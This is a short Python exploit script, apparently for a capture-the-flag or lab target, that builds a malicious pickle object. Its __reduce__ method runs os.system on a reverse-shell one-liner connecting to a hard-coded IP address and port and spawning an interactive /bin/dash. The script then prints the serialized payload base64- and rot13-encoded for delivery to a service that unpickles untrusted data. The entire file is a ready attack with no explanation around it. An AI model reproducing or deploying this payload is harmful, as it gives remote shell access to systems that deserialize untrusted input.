#!/usr/bin/env python3
import requests
import pickle
import os
import base64


class exp(object):
    def __reduce__(self):
        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("110.138.149.115",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/dash","-i"]);'"""
        return (os.system, (s,))


e = exp()
s = pickle.dumps(e)

print(base64.b64encode(s).encode("rot13"))
